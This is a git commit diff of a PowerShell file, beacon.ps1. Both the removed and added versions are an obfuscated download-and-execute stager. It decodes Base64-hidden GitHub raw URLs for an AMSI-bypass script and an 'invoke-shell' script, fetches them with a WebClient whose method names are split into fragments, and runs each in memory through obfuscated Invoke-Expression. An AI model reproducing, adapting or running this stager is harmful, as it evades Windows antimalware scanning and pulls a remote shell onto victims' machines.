a67f0754056f330acc38defa3cd174708ca3f731
eytestingct-jpg <eytestingct@gmail.com>
2025-09-19 04:04:07 +0530

    Update beacon.ps1

--- beacon.ps1
+++ beacon.ps1
@@ -1,10 +1,19 @@
-${env:ComSpec}[-7..-(${(Get-Random -Minimum 1 -Maximum 4)})] -join '' | % { $x7qP9z = $_ }
-${env:ProgramData}[-$((3,5,7) | Get-Random)..-1] -join '' | % { $kM2rV8 = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2V5dGVzdGluZ2N0LWpwZy9Ub29saWVzL3JlZnMvaGVhZHMvbWFpbi9hbXNpLWJ5cGFzcy5wczE=')) }
-${env:Temp}[-(${(Get-Random -Minimum 2 -Maximum 6)})..-1] -join '' | % { $nT4jW1 = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2V5dGVzdGluZ2N0LWpwZy9Ub29saWVzL3JlZnMvaGVhZHMvbWFpbi9pbnZva2Utc2hlbGwucHMx')) }
-${x7qP9z} -eq 'powershell' | % { $pL8mQ3 = [System.Reflection.Assembly]::LoadWithPartialName(('System'+'.'+'Net')).GetType('System.Net.WebClient') }
-${pL8mQ3}::new() | % { $zR6vY9 = $_ }
-${zR6vY9}.([Convert]::FromBase64String('RG93bmxvYWRTdHJpbmc=') | % { [System.Text.Encoding]::UTF8.GetString($_) }).Invoke(${kM2rV8}) | % { $bN5hX2 = $_ }
-&([System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('SW52b2tlLUV4cHJlc3Npb24='))) ${bN5hX2}
-${pL8mQ3}::new() | % { $cJ9kT7 = $_ }
-${cJ9kT7}.([Convert]::FromBase64String('RG93bmxvYWRTdHJpbmc=') | % { [System.Text.Encoding]::UTF8.GetString($_) }).Invoke(${nT4jW1}) | % { $fW2pZ4 = $_ }
-&([System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('SW52b2tlLUV4cHJlc3Npb24='))) ${fW2pZ4}
+# Obfuscated PowerShell script to download and execute scripts in memory
+
+# Obfuscated variable names and Base64-encoded URLs
+${x9QzW7} = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2V5dGVzdGluZ2N0LWpwZy9Ub29saWVzL3JlZnMvaGVhZHMvbWFpbi9hbXNpLWJ5cGFzcy5wczE='))
+${kP4mR8vT} = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2V5dGVzdGluZ2N0LWpwZy9Ub29saWVzL3JlZnMvaGVhZHMvbWFpbi9pbnZva2Utc2hlbGwucHMx'))
+
+# Obfuscated WebClient creation and download
+${qZ3nJ9} = &('New'+'-Object') ('System'+'.'+'Net'+'.'+'WebClient')
+${vT2pL5} = ${qZ3nJ9}.('D'+'o'+'w'+'n'+'l'+'o'+'a'+'d'+'S'+'t'+'r'+'i'+'n'+'g').Invoke(${x9QzW7})
+
+# Execute first script
+&('I'+'n'+'v'+'o'+'k'+'e'+'-'+'E'+'x'+'p'+'r'+'e'+'s'+'s'+'i'+'o'+'n') ${vT2pL5}
+
+# Obfuscated second download and execution
+${mB7hY2} = &('New'+'-Object') ('System'+'.'+'Net'+'.'+'WebClient')
+${rK8wN1} = ${mB7hY2}.('D'+'o'+'w'+'n'+'l'+'o'+'a'+'d'+'S'+'t'+'r'+'i'+'n'+'g').Invoke(${kP4mR8vT})
+
+# Execute second script
+&('I'+'n'+'v'+'o'+'k'+'e'+'-'+'E'+'x'+'p'+'r'+'e'+'s'+'s'+'i'+'o'+'n') ${rK8wN1}
